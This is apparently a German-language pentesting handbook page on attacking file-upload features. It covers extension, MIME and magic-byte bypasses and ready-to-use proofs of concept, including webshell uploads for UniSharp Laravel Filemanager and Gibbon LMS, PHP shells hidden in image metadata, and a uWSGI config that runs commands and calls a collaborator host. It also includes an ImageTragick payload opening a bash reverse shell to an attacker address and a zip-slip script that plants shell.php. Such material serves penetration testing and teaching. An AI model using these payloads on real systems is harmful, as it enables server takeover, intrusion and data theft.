# Datei-Upload

{{#include ../../banners/hacktricks-training.md}}

## Allgemeine Methodik für Datei-Uploads

Weitere nützliche Erweiterungen:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Umgehung von Dateiendungsprüfungen

1. Falls vorhanden, prüfe die vorherigen Extensions. Teste sie auch mit einigen Großbuchstaben: _pHp, .pHP5, .PhAr ..._
2. _Überprüfe **das Hinzufügen einer gültigen Extension vor** der Ausführungs-Extension (verwende auch die vorherigen Extensions):_
- _file.png.php_
- _file.png.Php5_
3. Versuche, **Sonderzeichen am Ende hinzuzufügen.** Du könntest Burp verwenden, um alle **ascii** und **Unicode** Zeichen zu **bruteforce**n. (_Hinweis: Du kannst auch versuchen, die **zuvor genannten** **Extensions** zu verwenden_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Versuche, die Schutzmechanismen zu umgehen, indem du den Parser für Dateiendungen auf der Serverseite austrickst, mit Techniken wie dem **Verdoppeln** der **Extension** oder dem **Hinzufügen von Junk**-Daten (**null**-Bytes) zwischen den Extensions. _Du kannst auch die **vorherigen Extensions** verwenden, um ein besseres Payload vorzubereiten._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Füge **eine zusätzliche Schicht von Extensions** zur vorherigen Prüfung hinzu:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Versuche, die **ausführende Extension vor der gültigen Extension** zu setzen und hoffe, dass der Server falsch konfiguriert ist. (nützlich, um Apache-Misconfigurations auszunutzen, bei denen alles mit der Extension **.php**, aber nicht unbedingt endend in .php, Code ausführt):
- _ex: file.php.png_
7. Verwendung von **NTFS alternate data stream (ADS)** in **Windows**. In diesem Fall wird ein Doppelpunkt-Zeichen ":" nach einer verbotenen Extension und vor einer erlaubten eingefügt. In der Folge wird eine **leere Datei mit der verbotenen Extension** auf dem Server erstellt (z. B. "file.asax:.jpg”). Diese Datei kann später mit anderen Techniken wie der Verwendung ihres Short Filename bearbeitet werden. Das Muster "**::$data**” kann ebenfalls verwendet werden, um nicht-leere Dateien zu erzeugen. Daher kann das Hinzufügen eines Punktzeichens nach diesem Muster ebenfalls nützlich sein, um weitere Restriktionen zu umgehen (z. B. "file.asp::$data.”)
8. Versuche, die Dateinamen-Limits zu überschreiten. Die gültige Extension wird abgeschnitten und das bösartige PHP bleibt übrig. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Einige Upload-Handler trimmen oder normalisieren nachgestellte Punktzeichen im gespeicherten Dateinamen. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) Versionen vor 2.9.1 kannst du die Extension-Validierung umgehen durch:

- Verwendung eines gültigen image MIME und magic header (z. B. PNG’s `\x89PNG\r\n\x1a\n`).
- Benennung der hochgeladenen Datei mit einer PHP-Extension gefolgt von einem Punkt, z. B. `shell.php.`.
- Der Server entfernt den nachgestellten Punkt und persistiert `shell.php`, welches ausgeführt wird, wenn es in einem web-geservten Verzeichnis liegt (Standard public storage wie `/storage/files/`).

Minimaler PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Rufe dann den gespeicherten Pfad auf (typisch bei Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- Erzwinge strikte serverseitige allowlists und validiere den gespeicherten Dateinamen erneut.
- Serve uploads from non-executable locations.

### Umgehung von Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Umgehung der **magic number**-Prüfung, indem man am Anfang der Datei die **bytes of a real image** hinzufügt (verwirrt das _file_ command). Oder das Shell in den **metadata** einfügen:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oder man könnte das **payload direkt** in ein Bild einbringen:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Wenn **compressions** zu deinem Bild hinzugefügt werden, zum Beispiel unter Verwendung einiger Standard-PHP-Bibliotheken wie [PHP-GD](https://www.php.net/manual/fr/book.image.php), sind die vorherigen Techniken nicht mehr nützlich. Du könntest jedoch den **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **survive compression**.
- [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Die Webseite könnte das **image** auch **resizen**, z. B. mit den PHP-GD-Funktionen `imagecopyresized` oder `imagecopyresampled`. Du könntest jedoch den **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **survive compression**.
- [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Eine weitere Technik, um ein Payload zu erstellen, das ein Bild-Resizing überlebt, verwendet die PHP-GD-Funktion `thumbnailImage`. Alternativ kann man den **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) nutzen, um Text einzufügen, der die **survive compression**.
- [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Weitere Tricks zum Prüfen

- Find a vulnerability to **rename** the file already uploaded (to change the extension).
- Find a **Local File Inclusion** vulnerability to execute the backdoor.
- **Mögliche Informationsoffenlegung**:
1. Lade die **gleiche Datei** **mehrmals** (und **gleichzeitig**) mit **dem gleichen Namen** hoch.
2. Lade eine Datei mit dem **Namen** einer **Datei** oder **Ordners**, der **bereits existiert**, hoch.
3. Hochladen einer Datei mit **"." , "..", or "…" as its name**. Zum Beispiel: In Apache auf **Windows**, wenn die Anwendung die hochgeladenen Dateien im Verzeichnis "/www/uploads/" speichert, wird der Dateiname "." eine Datei namens "uploads" im Verzeichnis "/www/" erstellen.
4. Lade eine Datei hoch, die sich nicht leicht löschen lässt, z. B. **"…:.jpg"** in **NTFS**. (Windows)
5. Lade eine Datei in **Windows** mit **invalid characters** wie `|<>*?”` im Namen hoch. (Windows)
6. Lade eine Datei in **Windows** hoch, die **reserved** (**forbidden**) **names** wie CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, und LPT9 verwendet.
- Versuche außerdem, eine **upload an executable** (.exe) oder eine **.html** (weniger verdächtig) hochzuladen, die **code ausführen wird**, wenn sie versehentlich vom Opfer geöffnet wird.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die Ausführung der payload erfolgt während des Parsens der Konfigurationsdatei. Damit die Konfiguration aktiviert und geparst wird, muss der uWSGI-Prozess entweder neu gestartet werden (z. B. nach einem Crash oder aufgrund eines Denial of Service-Angriffs) oder die Datei muss auf auto-reload gesetzt sein. Die auto-reload-Funktion, falls aktiviert, lädt die Datei in definierten Intervallen neu, sobald Änderungen erkannt werden.

Es ist wichtig, die nachlässige Natur des Parsings der uWSGI-Konfigurationsdatei zu verstehen. Konkret kann die erwähnte payload in eine Binärdatei (z. B. ein Bild oder ein PDF) eingefügt werden, was den möglichen Exploit-Radius weiter erweitert.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Ein nicht authentifizierter Endpoint in Gibbon LMS erlaubt beliebiges Schreiben von Dateien innerhalb des Web-Roots, was zu pre-auth RCE durch Ablegen einer PHP-Datei führt. Verwundbare Versionen: bis einschließlich 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-ähnlicher String: `[mime];[name],[base64]` (der Server ignoriert type/name und dekodiert das Base64-Ende)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimaler PoC, um eine Datei zu schreiben und zurückzulesen:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Lege eine minimale webshell ab und führe Befehle aus:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Hinweise:
- Der Handler führt `base64_decode($_POST["img"])` aus, nachdem er an `;` und `,` aufgeteilt wurde, und schreibt dann die Bytes nach `$absolutePath . '/' . $_POST['path']`, ohne Dateiendung/Type zu validieren.
- Der resultierende Code läuft als Webservice-Benutzer (z. B. XAMPP Apache unter Windows).

Referenzen für diesen Bug beinhalten die usd HeroLab advisory und den NVD-Eintrag. Siehe den Abschnitt References weiter unten.

## **wget File Upload/SSRF Trick**

In manchen Fällen kann es vorkommen, dass ein Server **`wget`** verwendet, um **Dateien herunterzuladen**, und man die **URL** angeben kann. In diesen Fällen könnte der Code prüfen, dass die Extension der heruntergeladenen Dateien in einer Whitelist steht, um sicherzustellen, dass nur erlaubte Dateien heruntergeladen werden. Allerdings **lässt sich diese Prüfung umgehen.**\
Die **maximale** Länge eines **Dateinamens** in **linux** beträgt **255**, jedoch kürzt **wget** die Dateinamen auf **236** Zeichen. You can **download a file called "A"*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Beachte, dass eine **andere Option**, an die du vielleicht denkst, um diese Prüfung zu umgehen, darin besteht, den **HTTP-Server auf eine andere Datei umzuleiten**, sodass die ursprüngliche URL die Prüfung umgeht und wget dann die weitergeleitete Datei mit dem neuen Namen herunterlädt. Das **funktioniert nicht**, **es sei denn** wget wird mit dem **Parameter** `--trust-server-names` verwendet, da **wget die weitergeleitete Seite mit dem im ursprünglichen URL angegebenen Dateinamen herunterladen wird**.

## Werkzeuge

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) ist ein leistungsstarkes Tool, das Pentesters und Bug Hunters beim Testen von File-Upload-Mechanismen unterstützt. Es nutzt verschiedene bug bounty Techniken, um den Prozess der Identifizierung und Ausnutzung von Schwachstellen zu vereinfachen und eine gründliche Bewertung von Webanwendungen zu ermöglichen.

### Korruption von Upload-Indizes durch snprintf-Eigenheiten (historisch)

Einige veraltete Upload-Handler, die `snprintf()` oder ähnliches verwenden, um Multi-File-Arrays aus einem Single-File-Upload zu bauen, können dazu gebracht werden, die `_FILES`-Struktur zu fälschen. Aufgrund von Inkonsistenzen und Abschneidungen im `snprintf()`-Verhalten kann ein sorgfältig gestalteter Einzel-Upload auf der Serverseite als mehrere indizierte Dateien erscheinen und Logik verwirren, die eine strikte Form annimmt (z. B. als Multi-File-Upload behandelt wird und unsichere Pfade einschlägt). Obwohl heute eher Nischenfälle, taucht dieses „index corruption“-Muster gelegentlich in CTFs und älterem Code wieder auf.

## Vom File-Upload zu anderen Schwachstellen

- Setze **filename** auf `../../../tmp/lol.png` und versuche, einen **path traversal** zu erreichen
- Setze **filename** auf `sleep(10)-- -.jpg` und möglicherweise eine **SQL injection** zu erreichen
- Setze **filename** auf `<svg onload=alert(document.domain)>`, um XSS zu erreichen
- Setze **filename** auf `; sleep 10;`, um auf einige command injection zu testen (mehr [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Probiere **different svg payloads** von [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Wenn du dem Webserver angeben kannst, ein Image von einer URL zu holen, könntest du versuchen, ein [SSRF](../ssrf-server-side-request-forgery/index.html) auszunutzen. Wenn dieses **image** an einem **öffentlichen** Ort gespeichert wird, könntest du auch eine URL von [https://iplogger.org/invisible/](https://iplogger.org/invisible/) angeben und **Informationen jedes Besuchers stehlen**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Speziell gestaltete PDFs zu XSS: Die [folgende Seite zeigt, wie man **PDF-Daten injiziert, um JS-Ausführung zu erhalten**](../xss-cross-site-scripting/pdf-injection.md). Wenn du PDFs hochladen kannst, könntest du ein PDF vorbereiten, das beliebiges JS gemäß den dortigen Anweisungen ausführt.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content, um zu prüfen, ob der Server ein **Antivirus** hat
- Prüfe, ob es eine **Größenbegrenzung** beim Hochladen von Dateien gibt

Hier ist eine Top-10-Liste von Dingen, die du durch Upload erreichen kannst (von [hier](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Siehe [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) für andere Dateitypen.

## Zip/Tar-Datei, die beim Upload automatisch entpackt wird

Wenn du eine ZIP hochladen kannst, die auf dem Server entpackt wird, kannst du zwei Dinge tun:

### Symlink

Lade ein Archiv hoch, das Symlinks zu anderen Dateien enthält; beim Zugriff auf die entpackten Dateien greifst du auf die verlinkten Dateien zu:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekomprimieren in verschiedene Ordner

Die unerwartete Erstellung von Dateien in Verzeichnissen während der Dekompression ist ein erhebliches Problem. Obwohl man zunächst annehmen könnte, dass diese Konfiguration Schutz gegen OS-level command execution durch bösartige Datei-Uploads bietet, können die hierarchische Kompressionsunterstützung und die directory traversal-Fähigkeiten des ZIP-Archivformats ausgenutzt werden. Dadurch können Angreifer Beschränkungen umgehen und aus sicheren Upload-Verzeichnissen entkommen, indem sie die Dekompressionsfunktionalität der Zielanwendung manipulieren.

Ein automatisierter Exploit zum Erstellen solcher Dateien ist verfügbar unter [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Das Tool kann wie folgt verwendet werden:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Außerdem ist der **symlink trick with evilarc** eine Option. Wenn das Ziel darin besteht, eine Datei wie `/flag.txt` anzusprechen, sollte ein Symlink zu dieser Datei in Ihrem System erstellt werden. Dadurch stößt evilarc während seiner Ausführung nicht auf Fehler.

Unten ist ein Beispiel für Python-Code, mit dem eine bösartige zip-Datei erstellt wird:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Ausnutzen der Kompression für file spraying**

Für weitere Details **siehe den Originalbeitrag unter**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP-Code wird geschrieben, um Befehle auszuführen, die über die Variable `$_REQUEST` übergeben werden.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Mehrere Dateien werden erstellt und ein zip-Archiv wird zusammengestellt, das diese Dateien enthält.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modifikation mit einem Hex-Editor oder vi**: Die Namen der Dateien innerhalb des zip werden mit vi oder einem Hex-Editor verändert, wobei "xxA" durch "../" ersetzt wird, um Directory Traversal durchzuführen.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Lade diesen Inhalt mit einer Bild-Dateiendung hoch, um die Schwachstelle **(ImageMagick , 7.0.1-1)** auszunutzen (aus dem [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Einbetten einer PHP-Shell in PNG

Das Einbetten einer PHP-Shell in den IDAT-Chunk einer PNG-Datei kann bestimmte Bildverarbeitungsoperationen effektiv umgehen. Die Funktionen `imagecopyresized` und `imagecopyresampled` aus PHP-GD sind in diesem Zusammenhang besonders relevant, da sie jeweils häufig zum Skalieren bzw. Resampling von Bildern verwendet werden. Dass die eingebettete PHP-Shell von diesen Operationen unbeeinträchtigt bleiben kann, ist für bestimmte Anwendungsfälle ein bedeutender Vorteil.

Eine detaillierte Untersuchung dieser Technik, einschließlich Methodik und potenzieller Anwendungen, wird im folgenden Artikel beschrieben: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Diese Ressource bietet ein umfassendes Verständnis des Prozesses und seiner Implikationen.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot-Dateien

Polyglot-Dateien dienen als einzigartiges Werkzeug in der Cybersicherheit und agieren wie Chamäleons, die gleichzeitig in mehreren Dateiformaten gültig sein können. Ein interessantes Beispiel ist ein [GIFAR](https://en.wikipedia.org/wiki/Gifar), ein Hybrid, der sowohl als GIF als auch als RAR-Archiv funktioniert. Solche Dateien sind nicht auf diese Kombination beschränkt; Kombinationen wie GIF und JS oder PPT und JS sind ebenfalls möglich.

Der Hauptnutzen von Polyglots liegt in ihrer Fähigkeit, Sicherheitsmaßnahmen zu umgehen, die Dateien nach Typ filtern. Übliche Praxis in vielen Anwendungen ist es, nur bestimmte Dateitypen für Uploads zuzulassen — wie JPEG, GIF oder DOC — um das Risiko potenziell schädlicher Formate (z. B. JS, PHP oder Phar) zu reduzieren. Ein Polyglot kann jedoch, indem er die strukturellen Kriterien mehrerer Dateitypen erfüllt, diese Einschränkungen unauffällig umgehen.

Trotz ihrer Anpassungsfähigkeit stoßen Polyglots auf Einschränkungen. Beispielsweise kann ein Polyglot gleichzeitig eine PHAR-Datei (PHp ARchive) und ein JPEG darstellen; ob der Upload erfolgreich ist, hängt jedoch oft von den Richtlinien der Plattform bezüglich erlaubter Dateiendungen ab. Wenn das System strikt bei den erlaubten Extensions ist, reicht die strukturelle Dualität eines Polyglots möglicherweise nicht aus, um den Upload zu gewährleisten.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Gültige JSONs hochladen, als wären sie PDF

Wie man Datei-Typ-Erkennungen umgeht, indem man eine gültige JSON-Datei hochlädt, auch wenn dies nicht erlaubt ist, indem man eine PDF-Datei vortäuscht (Techniken aus **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Solange die `%PDF` magic bytes in den ersten 1024 Bytes enthalten sind, gilt die Datei als gültig (Beispiel im Beitrag).
- **`pdflib` library**: Füge ein gefälschtes PDF-Format innerhalb eines Felds im JSON hinzu, sodass die Library denkt, es sei ein PDF (Beispiel im Beitrag).
- **`file` binary**: Es kann bis zu 1048576 Bytes aus einer Datei lesen. Erstelle einfach ein JSON, das größer ist, sodass es den Inhalt nicht als JSON parsen kann, und füge dann im JSON den Anfangsteil einer echten PDF ein — `file` wird denken, es sei ein PDF.

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
